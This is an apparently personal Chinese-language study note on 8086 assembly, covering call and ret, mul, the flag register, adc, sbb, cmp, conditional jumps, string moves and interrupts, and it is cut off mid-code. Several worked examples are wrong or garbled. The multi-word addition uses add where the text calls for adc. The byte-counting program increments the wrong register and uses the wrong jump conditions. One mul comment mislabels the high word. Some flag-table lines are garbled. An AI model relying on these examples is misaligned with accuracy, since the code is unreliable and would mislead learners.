指令</h3><p>格式：call 16位 reg</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs assembly">(sp)=(sp)-2<br>((ss)*16+(sp))=(IP)<br>(IP)=(16位reg)<br><br>//相当于<br>push IP<br>jmp 16位reg<br></code></pre></td></tr></table></figure><h3 id="10-6-转移地址在内存中的-call-指令"><a href="#10-6-转移地址在内存中的-call-指令" class="headerlink" title="10.6 转移地址在内存中的 call 指令"></a>10.6 转移地址在内存中的 call 指令</h3><p><strong>1） call  word  ptr 内存单元地址</strong></p><p>​相当于</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">push IP<br>jmp word ptr 内存单元地址<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov sp,10h<br>mov ax,0123h<br>mov ds:[0],ax<br>call word ptr ds:[0]<br>//(IP)=0123H,(sp)=0EH<br></code></pre></td></tr></table></figure><p><strong>2) call  dword  ptr  内存单元地址</strong></p><p>​相当于</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">push CS<br>push IP<br>jmp dword ptr 内存单元地址<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov sp,10h<br>mov ax,0123h<br>mov ds:[0],ax<br>mov word ptr ds:[2],0<br>call dword ptr ds:[0]//进行两次压栈操作，sp-2-2<br>//(CS)=0,(IP)=0123H,(sp)=0CH<br></code></pre></td></tr></table></figure><p>e.g 下面程序执行后，ax 和 bx 值为多少</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:code<br>data segment<br>dw 8 dup (0)<br>data ends<br>code segment<br> start:mov ax,data//3字节<br> mov ss,ax//2字节<br> mov sp,16//3字节<br> mov word ptr ss:[0],offset s//7字节<br> //(ss:[0]=1ah)<br> <br> mov ss:[2],cs//4字节<br> //(ss:[2])=cs<br> <br> call dword ptr ss:[0]//7字节<br> //cs入栈,ip=19h入栈，转到cs:1ah处执行指令，(ss:[4])=cs,(ss:[6])=ip<br> <br> nop<br> s:mov ax,offset s//ax=1ah<br> sub ax,ss:[0cH]<br> //ax=1ah-(ss:[0ch])=1ah-19h=1<br> <br> mov bx,cs//bx=cs=0c5bh<br> sub bx,ss:[0eH]//bx=cs-cs=0<br> mov ax,4c00h<br> int 21h<br>code ends<br>end start<br></code></pre></td></tr></table></figure><h3 id="10-7-call-和-ret-的配合使用"><a href="#10-7-call-和-ret-的配合使用" class="headerlink" title="10.7 call 和 ret 的配合使用"></a>10.7 call 和 ret 的配合使用</h3><p>e.g bx 的值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:code<br>code segment<br> start:mov ax,1<br> mov cx,3<br> call s//IP指向下一条指令，并压栈，将IP的值改变为标号为s处的偏移地址<br> <br> mov bx,ax<br> <br> mov ax,4c00h<br> int 21h<br> s:add ax,ax<br> loop s//ax=8<br> ret//前压入的指令偏移地址送入IP中。CS:IP指向指令mov bx,ax，从此开始执行命令。bx=8<br>code ends<br>end start<br></code></pre></td></tr></table></figure><h3 id="10-8-mul-指令"><a href="#10-8-mul-指令" class="headerlink" title="10.8 mul 指令"></a>10.8 mul 指令</h3><ul><li><p>mul 是乘法指令</p></li><li><p>两个相乘的数位要一样，<strong>8位默认放在 AL</strong> 中，另一个放在8位 reg 或内存字节单元中；<strong>16位放在AX中</strong>，另一个放在16位 reg 或内存字单元中。</p></li><li><p>8位乘法，结果默认放在 AX 中；16位，结果高位默认在 DX 中，低位 AX 中。</p></li></ul><p>格式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mul reg<br>mul 内存单元<br></code></pre></td></tr></table></figure><p>内存单元可以用不同的寻址方式给出，比如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mul byte ptr ds:[0]<br>//(ax)=(al)*((ds)*16+0)<br><br>mul word ptr [bx+si+8]<br>//(ax)=(ax)*((ds)*16+(bx)+(si)+8)结果的低16位<br>//(dx)=(ax)*((ds)*16+(bx)+(si)+8)结果的低16位<br></code></pre></td></tr></table></figure><p>e.g 计算 100 * 10</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov al,100<br>mov bl,10<br>mul bl<br>//(ax)=1000(03E8H)<br></code></pre></td></tr></table></figure><p>​计算 100 * 10000</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov ax,100<br>mov bx,10000<br>mul bx<br>//(ax)=4240H,(dx)=000FH<br></code></pre></td></tr></table></figure><h3 id="10-10-参数和结果传递的问题"><a href="#10-10-参数和结果传递的问题" class="headerlink" title="10.10 参数和结果传递的问题"></a>10.10 参数和结果传递的问题</h3><p>e.g 计算 data 段中第一组数据的 3 次方，结果保存在后面一组 dword 单元中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:code<br> data segment<br> dw 1,2,3,4,5,6,7,8<br> dd 0,0,0,0,0,0,0,0<br> data ends<br> code segment<br> start:mov ax,data<br> mov ds,ax<br> mov si,0//ds:si 指向第一组 word 单元<br> mov di,16//ds:si 指向第二组 dword 单元<br> <br> mov cx,8<br> s:mov bx,[si]<br> call cube<br> mov [di],ax<br> mov [di].2,dx<br> add si,2//ds:si 指向下一个 word 单元<br> add di,4//ds:si 指向下一个 dword 单元<br> loop s<br> <br> mov ax,4c00h<br> int 21h<br> cube:mov ax,bx<br> mul bx<br> mul bx<br> ret<br> code ends<br>end start<br></code></pre></td></tr></table></figure><h1 id="十一、标志寄存器"><a href="#十一、标志寄存器" class="headerlink" title="十一、标志寄存器"></a>十一、标志寄存器</h1><p>标志寄存器 flag 按位起作用</p><p><img src="https://img.dkdun.cn/v1/2025/12/b4e62b03ac53ddf3.png"></p><h3 id="11-1-ZF-标志"><a href="#11-1-ZF-标志" class="headerlink" title="11.1 ZF 标志"></a>11.1 ZF 标志</h3><p>flag 的第 6 位是 ZF ，零标志位。如果执行相关指令后，结果为 0，zf &#x3D; 1;不为 0，zf &#x3D;0</p><h3 id="11-2-PF标志"><a href="#11-2-PF标志" class="headerlink" title="11.2 PF标志"></a>11.2 PF标志</h3><p>flag 第 2 位是 PF，奇偶标志位。记录相关指令执行后，结果的所有 bit 位中1的个数是否为偶数，如果是偶数，pf &#x3D; 1，如果是奇数，pf &#x3D; 0</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov al,1<br>add al,10<br>//00001011B，3个1，pf=0<br>mov al,1<br>or al,2<br>//执行后，结果为 00000011B，有 2 个1，pf=1<br>sub al,al<br>// 00000000B,0个偶数，pf=1<br></code></pre></td></tr></table></figure><h3 id="11-3-SF-标志"><a href="#11-3-SF-标志" class="headerlink" title="11.3 SF 标志"></a>11.3 SF 标志</h3><p>flag 第7位，符号标志位。记录执行指令后，结果是否为负。结果为负，sf &#x3D;1；如果非负，sf &#x3D;0</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs assembly">sub al,al ZF=1  PF=1  SF=0<br>mov al,1110<br>push ax110<br>pop bx110<br>//mov,push,pop等传送指令对标志寄存器没影响<br>add al,bl000<br>add al,10010<br>mul al010<br></code></pre></td></tr></table></figure><h3 id="11-4-CF-标志"><a href="#11-4-CF-标志" class="headerlink" title="11.4 CF 标志"></a>11.4 CF 标志</h3><p>flag 第 0 位是 CF，进位标志位。一般情况下，在进行无符号运算时，记录了运算结果的最高有效位向跟高位的进位值，或从更高位的借位值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov al,98H<br>add al,al//(al)=30H,CF=1,CF记录了从最高有效位向跟高位的进位值<br>add al,al//(al)=60H,CF=0<br><br>mov al,97H<br>sub al,98H//(al)=FFH,CF=1，CF记录了向更高位的借位值<br>sub al,al//(al)=0,CF=0<br></code></pre></td></tr></table></figure><h3 id="11-5-OF-标志"><a href="#11-5-OF-标志" class="headerlink" title="11.5 OF 标志"></a>11.5 OF 标志</h3><p>flag 第 11 位是 OF，溢出标志位。OF 记录有符号数运算的结果是否发生溢出。溢出 OF &#x3D; 1，没有 OF &#x3D; 0           </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov al,0F0H<br>add al,88H<br>//执行后，CF=1，OF=1.无符号运算,0F0H+88H有进位,CF=1;有符号运算,0F0H+88H发生溢出,OF=1<br><br>mov al,0F0H<br>add al,78H<br>//CF=1,OF=0.无符号运算0F0H+78H有进位,CF=1;有符号运算,0F0H+78H不发生溢出,OF=0<br></code></pre></td></tr></table></figure><p>e.g 下列每条指令执行后，ZF 、PF、SF、CF、OF等标志位的值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs assembly">sub al,al//ZF=1,PF=1,SF=0,CF=0,OF=0<br>mov al,10H//11000<br>add al,90H//01100<br>mov al,80H//01100<br>add al,80H//11011<br>mov al,0FCH//11011<br>add al,05H//00010<br>mov al,7DH//00010<br>add al,0BH//01101<br></code></pre></td></tr></table></figure><h3 id="11-6-adc-指令"><a href="#11-6-adc-指令" class="headerlink" title="11.6 adc 指令"></a>11.6 adc 指令</h3><p><strong>adc 为带进位加法指令</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">格式:adc 操作对象1,操作对象2<br>功能:操作对象1 = 操作对象1 + 操作对象2 + CF<br>//指令: adc ax,bx<br>//(ax)=(ax)+(bx)+CF<br></code></pre></td></tr></table></figure><p>e.g </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov ax,2<br>mov bx,1<br>sub bx,ax<br>adc ax,1<br>//(ax)=4,(ax)+1+CF=4<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov ax,1<br>add ax,ax<br>adc ax,3<br>//(ax)=2+3+0=5<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov al,98H<br>add al,al<br>adc al,3<br>//(al)=34H,(al)+3+CF=30H+3+1=34H<br></code></pre></td></tr></table></figure><p><strong>执行 adc 指令时，CF 的值如果是被 sub 指令设置的，那么就是借位值</strong></p><p><strong>add 指令设置时，是进位值</strong></p><p>加法可以分两部进行：</p><ul><li>低位相加，比如 0198H 和 0183H。低位相加得 1B</li><li>高位相加再加上低位相加的进位值。01+01+1&#x3D;03</li></ul><p>e.g 计算 1EF0001000H + 2010001EF0H，结果放在 ax(最高 16 位)，bx(次高 16 位)，cx(低 16 位)中</p><ul><li>先将低 16 位相加，然后 CF 中记录本次相加的进位值</li><li>再将高 16 位和 CF 相加，然后 CF记录进位值</li><li>最后高 16 位和 CF相加，CF记录进位值</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov ax,001EH<br>mov bx,0F000H<br>mov cx,1000H<br>add cx,1EF0H<br>add bx,1000H<br>add ax,0020H<br></code></pre></td></tr></table></figure><h3 id="11-7-sbb指令"><a href="#11-7-sbb指令" class="headerlink" title="11.7 sbb指令"></a>11.7 sbb指令</h3><p><strong>sbb 是带借位减法指令，利用 CF 位上记录的借位值</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">sbb 操作对象1，操作对象2<br>操作对象1 = 操作对象1 - 操作对象2 - CF<br>//sbb ax,bx<br>//(ax)=(ax)-(bx)-CF<br></code></pre></td></tr></table></figure><p>e.g 计算 003E1000H - 00202000H,结果放在 ax,bx 中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov bx,1000H<br>mov ax,003EH<br>sub bx,2000H<br>sbb ax,0020H<br></code></pre></td></tr></table></figure><h3 id="11-8-cmp-指令"><a href="#11-8-cmp-指令" class="headerlink" title="11.8 cmp 指令"></a>11.8 cmp 指令</h3><p><strong>cmp 为比较指令，相当于减法，但不保存结果。执行后会对标志寄存器产生影响。</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">格式：cmp 操作对象1，操作对象2<br>功能：计算操作对象1 - 操作对象2，不保存结果，仅仅根据计算结果对标志寄存器进行设置<br>//cmp ax,ax<br>//结果为 0 ，指令执行后 zf=1,pf=1,sf=0,cf=0,of=0<br></code></pre></td></tr></table></figure><p>e.g </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov ax,8<br>mov bx,3<br>cmp ax,bx<br>//(ax)=8,zf=0,pf=1,sf=0,cf=0,of=0<br></code></pre></td></tr></table></figure><p><strong>对于 cmp ax,bx，有如下分析</strong></p><ul><li><pre><code class="assembly">if (ax==bx),(ax)-(bx)=0,zf=1if (ax!=bx),(ax)-(bx)!=0,zf=0if (ax&lt;bx),(ax)-(bx)&lt;0,产生借位,cf=1if (ax&gt;=bx),(ax)-(bx)&gt;=0,cf=0if (ax&gt;bx),(ax)-(bx)&gt;0,cf=0 或 zf=0if (ax&lt;=bx),(ax)-(bx)&lt;=0,cf=1 或 zf=1 if:    zf=1,说明 (ax)=(bx)    zf=0,(ax)!=(bx)    cf=1,(ax)&lt;(bx)    cf=0,(ax)&gt;=(bx)    cf=0 且 zf=0,(ax)&gt;(bx)    cf=1 或 zf=1,(ax)&lt;=(bx)<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><br><br>对有符号数进行比较时<br><br>**对于<span class="hljs-keyword">cmp</span> <span class="hljs-number">ah</span>,<span class="hljs-number">bh</span>**<br><br><span class="hljs-string">```</span>assembly<br>if (<span class="hljs-number">ah</span>==<span class="hljs-number">bh</span>),(<span class="hljs-number">ah</span>)-(<span class="hljs-number">bh</span>)=<span class="hljs-number">0</span>,zf=<span class="hljs-number">1</span><br>if (<span class="hljs-number">ah</span>!=<span class="hljs-number">bh</span>),(<span class="hljs-number">ah</span>)-(<span class="hljs-number">bh</span>)!=<span class="hljs-number">0</span>,zf=<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure></code></pre></li></ul><ol><li><p>如果 sf &#x3D;1,of&#x3D;0</p><p>of &#x3D;0，没有溢出，逻辑上真正结果的正负 &#x3D; 实际结果的正负</p><p>sf &#x3D;1，实际结果为负数，所以逻辑上真正的结果为负，(ah)&lt;(bh)</p></li><li><p>如果 sf &#x3D;1，of &#x3D;1</p><p>of &#x3D;1，有溢出，逻辑上真正结果的正负与实际结果的正负不相等</p><p>sf &#x3D;1，实际结果为负</p><p><strong>如果因为溢出导致实际结果为负，那么逻辑上真正的结果为正（ah)&gt;(bh)</strong></p></li><li><p>如果 sf &#x3D; 0,of &#x3D; 1</p><p>sf&#x3D;0，实际结果为非负，而 of &#x3D;1 说明有溢出 ，结果为非 0 ，实际结果为正</p><p><strong>如果因为溢出导致实际结果为非负，那么逻辑上真正结果为负，（ah)&lt;(bh)</strong></p></li><li><p>sf &#x3D;0,of &#x3D;0</p><p>没有溢出，实际结果为非负，（ah)&gt;&#x3D;(bh)</p></li></ol><h3 id="11-9-检测比较结果的条件转移指令"><a href="#11-9-检测比较结果的条件转移指令" class="headerlink" title="11.9 检测比较结果的条件转移指令"></a>11.9 检测比较结果的条件转移指令</h3><p>“ 转移 ”指它能修改 IP，“ 条件 ”指它可以根据某种条件，决定是否修改 IP</p><table><thead><tr><th>指令</th><th>含义</th><th>检测的相关标志位</th></tr></thead><tbody><tr><td>je</td><td>等于则转移</td><td>zf &#x3D; 1</td></tr><tr><td>jne</td><td>不等于就转移</td><td>zf &#x3D; 0</td></tr><tr><td>jb</td><td>低于则转移</td><td>cf &#x3D;1</td></tr><tr><td>jnb</td><td>不低于就转移</td><td>cf &#x3D; 0</td></tr><tr><td>ja</td><td>高于就转移</td><td>cf &#x3D; 0且 zf &#x3D;0</td></tr><tr><td>jna</td><td>不高于就转移</td><td>cf &#x3D;1 或 zf &#x3D; 1</td></tr></tbody></table><p><strong>e.g</strong>  统计 data 段中数值小于 8 的字节的个数，用 ax 保存统计结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov ax,data<br>mov ds,ax<br>mov ax,0<br>mov bx,0<br>mov cx,8<br>s:cmp byte ptr [bx],8<br>jnb next<br>inc ax<br>next:inc bx<br>loop s<br>//(ax)=2<br></code></pre></td></tr></table></figure><p>统计 F000:0 处 32 个字节中，大小在 [32,128] 的数据个数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov ax,0f000h<br>mov ds,ax<br>mov bx,0<br>mov dx,0<br>mov cx,32<br>s:mov al,[bx]<br>cmp al,32<br>ja s0<br>cmp al,128<br>ja s0<br>inc bx<br>s0:inc bx<br>loop s<br></code></pre></td></tr></table></figure><h3 id="11-10-DF-标志和串传送指令"><a href="#11-10-DF-标志和串传送指令" class="headerlink" title="11.10 DF 标志和串传送指令"></a>11.10 DF 标志和串传送指令</h3><p>flag 第 10 位，方向标志位。在串处理指令中，控制每次操作后 si ,di 的增减</p><p>df &#x3D; 0  每次操作后 si、di 递增</p><p>df &#x3D;1  每次操作后 si、di 递减</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs assembly">movsb<br>相当于:<br>((es)*16+(di))=((ds)*16)+si<br>如果 df=0: (si)=(si)+1<br>(di)=(di)+1<br>如果 df=1: (si)=(si)-1<br>(di)=(di)-1<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">movsw<br>将ds:si指向的内存单元中的字送入es:di中，根据标志寄存器df位的值，将si和di递增2或递减2<br></code></pre></td></tr></table></figure><p>8086 CPU 提供两条指令对 df 位进行设置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">cld 指令:将标志寄存器的df位置0<br>std 指令:将标志寄存器df位置1<br></code></pre></td></tr></table></figure><p>e.g 用串传送指令，将 F000H 段中的最后 16 个字符复制到 data 段中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs assembly">data segment<br> db 16 dup (0)<br>data ends<br>mov ax,0f000h<br>mov ds,ax<br>mov si,0ffffh//ds:si 指向 f000:ffff<br>mov ax,data<br>mov es,ax<br>mov di,15//es:di 指向 data:000f<br>mov cx,16//(cx)=16,rep 循环16次<br>std//设置 df=1,逆向传送<br>rep movsb<br></code></pre></td></tr></table></figure><h3 id="11-11-push-和-popf"><a href="#11-11-push-和-popf" class="headerlink" title="11.11 push 和 popf"></a>11.11 push 和 popf</h3><p>pushf 是将标志寄存器的值压栈，popf 是出栈送入标志寄存器中</p><p>e.g  （ax)&#x3D;？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov ax,0<br>push ax<br>popf<br>mov ax,0fff0h<br>add ax,0010h<br>pushf<br>pop ax//0 0 0 0 of df if tf sf zf 0 af 0 pf 0 cf<br>//0 0 0 0 0  0  *  *  0 1  0  * 0 1  0  1<br>//ax=flag=000000**010*0101b<br>and al,11000101B//al=01000101b=45h<br>and ah,00001000B//ah=00000000b=0h<br>//ax=45h<br></code></pre></td></tr></table></figure><p>11.12 标志寄存器在 Debug 中的表示</p><table><thead><tr><th>标志</th><th>1</th><th>0</th></tr></thead><tbody><tr><td>of</td><td>OV</td><td>NV</td></tr><tr><td>sf</td><td>NG</td><td>PL</td></tr><tr><td>zf</td><td>ZR</td><td>NZ</td></tr><tr><td>pf</td><td>PE</td><td>PO</td></tr><tr><td>cf</td><td>CY</td><td>NC</td></tr><tr><td>df</td><td>DN</td><td>UP</td></tr></tbody></table><h1 id="十二、内中断"><a href="#十二、内中断" class="headerlink" title="十二、内中断"></a>十二、内中断</h1><h3 id="12-1-内中断的产生"><a href="#12-1-内中断的产生" class="headerlink" title="12.1 内中断的产生"></a>12.1 内中断的产生</h3><p>对于 8086CPU ，有以下情况会产生中断</p><ul><li>除法错误，比如 div 指令产生的除法溢出</li><li>单步执行</li><li>into 指令</li><li>int 指令</li></ul><p>中断源在 8086CPU 中的中断类型</p><ul><li>除法错误：0</li><li>单步执行：1</li><li>into 指令：4</li><li>int 指令，格式为 int  n，n 为字节型立即数，是提供给 CPU 的中断类型码</li></ul><h3 id="12-3-中断向量表"><a href="#12-3-中断向量表" class="headerlink" title="12.3 中断向量表"></a>12.3 中断向量表</h3><p>对于 8086PC 机，中断向量表指定放在内存地址 0 处。从内存 0000:0000 到 0000:03FF 的 1024 个单元中存放着中断向量表。</p><p>e.g </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0000:0000 68 10 A7 00 8B 01 70 00-16 00 9D 03 8B 01 70 00<br>//3号中断源对应的中断处理程序的入口地址为: 0070:018B<br></code></pre></td></tr></table></figure><p><strong>一个表项存放一个中断向量，也就是一个中断处理程序的入口地址，入口地址包括段地址和偏移地址，一个表项占两个字，高地址存放段地址，低地址存放偏移地址</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">存储 N 号中断源对应的中断处理程序入口的偏移地址的内存单元的地址为:4N<br>段地址的内存单元地址为:4N+2<br></code></pre></td></tr></table></figure><h3 id="12-4-中断过程"><a href="#12-4-中断过程" class="headerlink" title="12.4 中断过程"></a>12.4 中断过程</h3><p>8086CPU 中断过程</p><ul><li>取得字段类型码 N</li><li>标志寄存器入栈，TF&#x3D;0,IF&#x3D;0</li><li>push CS</li><li>push IP</li><li>( IP ) &#x3D; ( N * 4 ) , ( CS ) &#x3D; ( N * 4 + 2 )</li></ul><h3 id="12-5-中断处理程序和-iret-指令"><a href="#12-5-中断处理程序和-iret-指令" class="headerlink" title="12.5 中断处理程序和 iret 指令"></a>12.5 中断处理程序和 iret 指令</h3><p>中断处理程序的编写方法</p><ul><li>保存用到的寄存器</li><li>处理中断</li><li>恢复用到的寄存器</li><li>用 iret 指令返回</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">pop IP<br>pop CS<br>popf<br></code></pre></td></tr></table></figure><p><strong>在中断过程中，寄存器入栈顺序是标志寄存器，CS，IP。iret 出栈顺序是 IP，CS，标志寄存器</strong></p><h3 id="12-9-do0"><a href="#12-9-do0" class="headerlink" title="12.9 do0"></a>12.9 do0</h3><p>do0 程序的主要任务是显示字符串</p><p>e.g 显示“ overflow！”</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span 